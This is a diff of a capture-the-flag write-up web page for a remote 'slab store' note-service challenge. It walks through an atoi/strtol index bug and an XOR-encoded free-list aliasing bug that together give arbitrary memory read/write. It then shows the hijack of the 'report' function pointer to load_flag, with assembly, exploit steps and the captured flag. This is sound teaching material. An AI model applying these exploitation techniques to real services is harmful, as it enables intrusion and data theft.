@@ -67,39 +67,246 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p><code>nc 0.cloud.chals.io 20535</code>, no artifact shipped - recovered entirely over the wire. A &quot;note store&quot;: <code>alloc | free &lt;i&gt; | edit &lt;i&gt; &lt;hex&gt; | read &lt;i&gt; | report | quit</code>, 16 slots, 96 bytes per note.</p>
-<p><strong>Bug #1 - index-parsing mismatch:</strong> the bounds check uses <code>atoi</code> (stops at first non-digit) while the array access uses <code>strtol(...,0)</code> (honours <code>0x</code>/sign). So <code>read 0x10</code>, <code>edit 0x10 ...</code> pass the bounds check but index outside the table - found to be a dead end (adjacent memory was zeros).</p>
-<p><strong>Bug #2 - the real primitive, XOR-encoded free-list + note aliasing:</strong> 16 note data pointers live in a <code>slots[]</code> table; <code>free(i)</code> doesn&#39;t wipe the note, it XOR-encodes the free-list link into the note&#39;s first 8 bytes with a per-process random key, and <code>alloc()</code> decodes the head with the same key to get the next note&#39;s data pointer. Because we control the bytes of a freed note, we control the decoded pointer - a freed note can be made to point anywhere, including at the <code>slots[]</code> table itself:</p>
-<figure class="wu-code wu-code-output" data-lines="3">
+<h2 id="1-recon-the-interface"><a class="wu-anchor" href="#1-recon-the-interface" aria-hidden="true">#</a>1. Recon - the interface</h2>
+<p>On connect the banner is a prompt:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
         <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-text">alloc x4 ; free 1 ; free 0
+      <pre id="code-1"><code class="language-text">slab store. commands: alloc | free &lt;i&gt; | edit &lt;i&gt; &lt;hex&gt; | read &lt;i&gt; | report | quit
+&gt;</code></pre>
+      
+    </figure><table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Reply</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>alloc</code></td>
+<td><code>idx N</code> / <code>no index slots</code></td>
+<td>returns the smallest free index, 16 slots max</td>
+</tr>
+<tr>
+<td><code>free &lt;i&gt;</code></td>
+<td><code>ok</code> / <code>bad index</code></td>
+<td>marks a slot free</td>
+</tr>
+<tr>
+<td><code>edit &lt;i&gt; &lt;hex&gt;</code></td>
+<td><code>ok</code></td>
+<td>writes <code>min(len,96)</code> decoded bytes into note <em>i</em></td>
+</tr>
+<tr>
+<td><code>read &lt;i&gt;</code></td>
+<td><code>data &lt;hex&gt;</code></td>
+<td>returns 96 bytes of note <em>i</em> (192 hex chars)</td>
+</tr>
+<tr>
+<td><code>report</code></td>
+<td><code>nothing to report.</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>quit</code></td>
+<td>(closes)</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>alloc</code>/<code>report</code>/<code>quit</code> are prefix-matched; <code>free</code>/<code>edit</code>/<code>read</code> need the exact word + space.</p>
+<h2 id="2-bug-1-index-parsing-mismatch-atoi-vs-strtol"><a class="wu-anchor" href="#2-bug-1-index-parsing-mismatch-atoi-vs-strtol" aria-hidden="true">#</a>2. Bug #1 - index-parsing mismatch (<code>atoi</code> vs <code>strtol</code>)</h2>
+<p>The bounds check and the array access do not parse the index the same way:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">c</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-c"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">if</span>      (<span class="hljs-built_in">strncmp</span>(buf,<span class="hljs-string">&quot;free &quot;</span>,<span class="hljs-number">5</span>)==<span class="hljs-number">0</span>)  { <span class="hljs-type">int</span> i=atoi(buf+<span class="hljs-number">5</span>);   <span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">0</span>||i&gt;<span class="hljs-number">15</span>) die(<span class="hljs-string">&quot;bad index&quot;</span>); <span class="hljs-built_in">free</span>(i);  }</span></span></code></pre>
+      
+    </figure><p>The check uses <strong><code>atoi</code></strong>, which stops at the first non-digit (<code>atoi(&quot;0x10&quot;) == 0</code>,
+<code>atoi(&quot;-x&quot;) == 0</code>), while the access path uses <strong><code>strtol(..., 0)</code></strong>, which honours <code>0x</code>/sign/
+whitespace (<code>strtol(&quot;0x10&quot;,0,0) == 16</code>). So <code>read 0x10</code>, <code>read -0x1</code>, <code>edit 0x10 …</code> all pass the
+bounds check and index <em>outside</em> the table. Handy, but by itself it only walks linearly and we
+found the table neighbourhood to be zeros - it was <strong>not</strong> the winning bug.</p>
+<h2 id="3-bug-2-xor-encoded-free-list-note-aliasing-the-real-primitive"><a class="wu-anchor" href="#3-bug-2-xor-encoded-free-list-note-aliasing-the-real-primitive" aria-hidden="true">#</a>3. Bug #2 - XOR-encoded free-list + note aliasing (the real primitive)</h2>
+<p>Each note is not stored inline; the store keeps 16 note <strong>data pointers</strong> in a table at
+<code>0x4b6b00</code> (<code>slots[]</code>), a used-flag bitmap at <code>0x4b6ac0</code>, a free-list head at <code>0x4b6b80</code>, and a
+per-process random XOR key at <code>0x4b6b90</code> (seeded once with <code>getrandom</code>).</p>
+<p><code>free(i)</code> does <strong>not</strong> wipe the note - it XOR-encodes the free-list link into the note&#39;s first 8
+bytes, and <code>alloc()</code> decodes the head with the same key to obtain the <em>next note&#39;s data pointer</em>:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">free(i):   *(slots[i]) = next ^ KEY
+alloc():   next = *(freelist_head) ; slots[new] = next ^ KEY   (i.e. = the decoded link)</code></pre>
+      
+    </figure><p>Because we control the bytes of a freed note, we control the decoded pointer, so we can make a
+note&#39;s <strong>data pointer point anywhere</strong>. The cleanest target is the <code>slots[]</code> table itself:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">alloc x4 ; free 1 ; free 0
 edit 0 &lt;p64(0x4b6b00 ^ KEY)&gt;     # encode SLOTS so alloc decodes to &amp;slots[0]
 alloc ; alloc                    # note1 now ALIASES the slot-pointer table</code></pre>
       
-    </figure><p>Writing note 1 now rewrites the entire pointer table - the store becomes a fully arbitrary 96-byte read/write primitive at any address. The per-process XOR key is trivially recovered live: <code>alloc; free 0; read 0</code> returns <code>0 ^ KEY = KEY</code>.</p>
-<p><strong>Recovering the program:</strong> with arbitrary read, dumped the ELF header, program headers, and <code>.rodata</code> strings, finding <code>flag.txt</code> referenced by a <code>load_flag()</code> function that opens the file, reads it into a stack buffer, and <code>write()</code>s it to a global fd - which is set to <strong>the current connection&#39;s socket fd</strong> by the per-connection handler.</p>
-<p><strong>The dispatch hijack:</strong> the <code>report</code> command handler dispatches through a writable function pointer currently pointing at a stub that just logs &quot;nothing to report.&quot; With the arbitrary write, overwrite that pointer to <code>load_flag</code>:</p>
+    </figure><p>Writing note 1 now rewrites the entire pointer table, and the store becomes a <strong>fully arbitrary
+96-byte read/write primitive at any address</strong>:</p>
+<ul>
+<li><code>edit 1 &lt;12 qwords&gt;</code> → sets <code>slots[0..11]</code> to any addresses</li>
+<li><code>read u</code> → returns the 96 bytes at <code>slots[u]</code> (arbitrary read, byte-aligned)</li>
+<li><code>edit u &lt;hex&gt;</code> → writes at <code>slots[u]</code> (arbitrary write, byte-aligned)</li>
+</ul>
+<p><strong>Key recovery is trivial and restart-proof</strong>: <code>alloc; free 0; read 0</code> returns
+<code>0 ^ KEY = KEY</code> in the first 8 bytes (observed <code>0x618d5153e0045e29</code> on the live server).</p>
+<blockquote>
+<p><code>fastread.py</code> packages the setup + the pipelined <code>read11([addr,…])</code> (11 windows per connection).</p>
+</blockquote>
+<h2 id="4-recovering-the-program"><a class="wu-anchor" href="#4-recovering-the-program" aria-hidden="true">#</a>4. Recovering the program</h2>
+<p>With arbitrary read I dumped the ELF header and program headers, then the user code (below the
+statically-linked glibc). Segments: <code>.text</code> <code>0x400000–0x4867fd</code>, <code>.rodata</code> <code>0x487000–0x4afbf0</code>,
+<code>.data/.bss</code> <code>0x4b09c8–0x4bd1e8</code> - non-PIE, so every address is fixed.</p>
+<p>Dumping the tight rodata pointer cluster at <code>0x487228–0x4872e2</code> yielded the program&#39;s own strings:</p>
 <figure class="wu-code wu-code-output" data-lines="6">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-text">1. setup the alias             -&gt; note1-&gt;data = 0x4b6b00 (the pointer table)
-2. arbitrary write: *0x4b50d0 = 0x4022e6  (load_flag)
-3. send: report
-   -&gt; handler calls load_flag() -&gt; opens flag.txt, writes it to our socket
+      <pre id="code-5"><code class="language-text">alloc / free  / edit  / read  / report / quit
+idx %d
+arena full            the vault is empty on this host
+banner                slab store. commands: …
+flag.txt              ★
+[chall] slab on 127.0.0.1:%d</code></pre>
+      
+    </figure><p>The string <strong><code>flag.txt</code></strong> is at <code>0x4872d4</code>. Tracing its reference lands in a small function at
+<strong><code>0x4022e6</code></strong> - <code>load_flag()</code>:</p>
+<figure class="wu-code" data-lines="10">
+      <figcaption>
+        
+        <span class="wu-code-lang">asm</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-asm"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">4022e6  <span class="hljs-keyword">lea</span>   <span class="hljs-built_in">rsp</span>,[<span class="hljs-built_in">rsp</span>-<span class="hljs-number">0xb8</span>]</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-number">402301</span>  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">esi</span>,<span class="hljs-number">0</span>                 <span class="hljs-comment">; O_RDONLY</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-number">402306</span>  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x4872d4</span>          <span class="hljs-comment">; &quot;flag.txt&quot;</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">40230b  <span class="hljs-keyword">call</span>  open</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"><span class="hljs-number">402312</span>  <span class="hljs-keyword">js</span>    <span class="hljs-number">0x40235d</span>              <span class="hljs-comment">; open failed -&gt; log &quot;the vault is empty on this host&quot;</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">40231e  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span>               <span class="hljs-comment">; buf  = local 0xa0 stack buffer</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-number">402321</span>  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">edx</span>,<span class="hljs-number">0xa0</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc"><span class="hljs-number">402328</span>  <span class="hljs-keyword">call</span>  read                  <span class="hljs-comment">; read(fd, rsp, 0xa0)</span></span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">40236f  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">edi</span>,[<span class="hljs-number">0x4b50c8</span>]        <span class="hljs-comment">; ★ the *client socket fd*, set by the handler on entry</span></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc"><span class="hljs-number">402375</span>  <span class="hljs-keyword">call</span>  write                 <span class="hljs-comment">; write(clientfd, buf, n)   &lt;-- would hand us the flag</span></span></span></code></pre>
+      
+    </figure><p>So <code>load_flag()</code> <strong>opens <code>flag.txt</code>, reads it into a stack buffer, and writes it to the global fd
+<code>0x4b50c8</code></strong>. And <code>0x4b50c8</code> is set to <strong>our connection&#39;s socket fd</strong> by the per-connection
+handler (<code>mov [0x4b50c8], edi</code> at <code>0x401de1</code>).</p>
+<h2 id="5-the-dispatch-hijack"><a class="wu-anchor" href="#5-the-dispatch-hijack" aria-hidden="true">#</a>5. The dispatch hijack</h2>
+<p>In the command handler, <code>report</code> is not a hard-coded call - it goes through a <strong>function pointer</strong>:</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">asm</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-asm"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">401ed6  <span class="hljs-keyword">mov</span>   <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x4872b1</span>          <span class="hljs-comment">; &quot;report&quot;</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">401edb  <span class="hljs-keyword">call</span>  strncmp</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">401ee2  <span class="hljs-keyword">jne</span>   <span class="hljs-number">0x40225c</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">401ee8  <span class="hljs-keyword">call</span>  <span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-number">0x4b50d0</span>]  <span class="hljs-comment">; ★ indirect call</span></span></span></code></pre>
+      
+    </figure><p><code>[0x4b50d0]</code> currently holds <code>0x401d6c</code>, a stub that logs <code>&quot;nothing to report.&quot;</code>. That pointer
+lives in writable <code>.data</code>, and we have an arbitrary write.</p>
+<h2 id="6-exploit"><a class="wu-anchor" href="#6-exploit" aria-hidden="true">#</a>6. Exploit</h2>
+<figure class="wu-code wu-code-output" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">1. setup the alias             -&gt; note1-&gt;data = 0x4b6b00 (the pointer table)
+2. arbitrary write:
+       *0x4b50d0 = 0x4022e6     ( load_flag )
+3. send:  report
+   -&gt; handler calls load_flag()
+   -&gt; open(&quot;flag.txt&quot;); read(fd, buf, 0xa0); write(clientfd, buf, n)
+   -&gt; the flag is printed to our socket</code></pre>
+      
+    </figure><p>Live output:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-text">funcptr now: e622400000000000 (want e622400000000000)
 --- report output ---
 b'isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}\n&gt; '</code></pre>
       
-    </figure><p>&quot;Convince it to hand you something that was never filed&quot;: the flag was never filed into the note store - the free-list XOR encoding (a custom &quot;slab&quot; allocator, no glibc recipe to lean on) is the vulnerability, giving an aliased note and thus arbitrary read/write, turning an inert <code>report</code> function pointer into a flag-exfiltration gadget.</p>
+    </figure><p><code>solve.py</code> / <code>exploit_flag.py</code> reproduce it end-to-end; it was run twice, identical flag.</p>
+<h2 id="7-why-this-is-the-intended-bug"><a class="wu-anchor" href="#7-why-this-is-the-intended-bug" aria-hidden="true">#</a>7. Why this is the intended bug</h2>
+<p>The description - <em>&quot;Convince it to hand you something that was never filed&quot;</em> - is exactly what
+happens: the flag was <strong>never filed into the note store</strong>; we make the store read a file it was
+never supposed to expose, and hand it back through its own <code>report</code> path. The note-store&#39;s
+free-list XOR encoding (&quot;slab&quot; = a slab allocator) is the vulnerability: an attacker-controlled
+free-list link gives an aliased note and thus arbitrary read/write, which turns an inert
+<code>report</code> function pointer into a flag-exfiltration gadget.</p>
+<h2 id="8-artifacts"><a class="wu-anchor" href="#8-artifacts" aria-hidden="true">#</a>8. Artifacts</h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exploit_flag.py</code></td>
+<td>one-shot solve (setup → hijack → <code>report</code>)</td>
+</tr>
+<tr>
+<td><code>fastread.py</code></td>
+<td>arbitrary-read engine (<code>FR</code>, <code>read11</code>, per-process KEY)</td>
+</tr>
+<tr>
+<td><code>dumprange.py</code></td>
+<td>dump an arbitrary memory range pgm→file</td>
+</tr>
+<tr>
+<td><code>HANDOFF.md</code></td>
+<td>state notes from the (pre-solve) session</td>
+</tr>
+<tr>
+<td><code>t*.py</code>, <code>scan*.py</code>, <code>fscan.py</code>, <code>rscan.py</code>, <code>stackleak.py</code></td>
+<td>probing/scanning variants used along the way</td>
+</tr>
+</tbody></table>
+<h2 id="9-pitfalls-encountered"><a class="wu-anchor" href="#9-pitfalls-encountered" aria-hidden="true">#</a>9. Pitfalls encountered</h2>
+<ul>
+<li>Long <strong>background</strong> scans stall - the server throttles/limits commands per connection.
+Run scans in the <strong>foreground</strong> in single-connection chunks, reconnecting on EOF.</li>
+<li>Index-only OOB (bug #1) is a red herring: the adjacent memory is zeros. The win comes from
+bug #2 (pointer aliasing), not from walking the index past the table.</li>
+<li>A 96-byte-granular read is enough, but the pointer-based primitive is byte-aligned - no need to
+worry about strings straddling note boundaries.</li>
+<li>The XOR key is <strong>per-process</strong>; derive it live (<code>alloc; free 0; read 0</code>) rather than hard-coding.</li>
+</ul>
 
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#1-recon-the-interface">1. Recon - the interface</a></li><li><a href="#2-bug-1-index-parsing-mismatch-atoi-vs-strtol">2. Bug #1 - index-parsing mismatch (atoi vs strtol)</a></li><li><a href="#3-bug-2-xor-encoded-free-list-note-aliasing-the-real-primitive">3. Bug #2 - XOR-encoded free-list + note aliasing (the real primitive)</a></li><li><a href="#4-recovering-the-program">4. Recovering the program</a></li><li><a href="#5-the-dispatch-hijack">5. The dispatch hijack</a></li><li><a href="#6-exploit">6. Exploit</a></li><li><a href="#7-why-this-is-the-intended-bug">7. Why this is the intended bug</a></li><li><a href="#8-artifacts">8. Artifacts</a></li><li><a href="#9-pitfalls-encountered">9. Pitfalls encountered</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
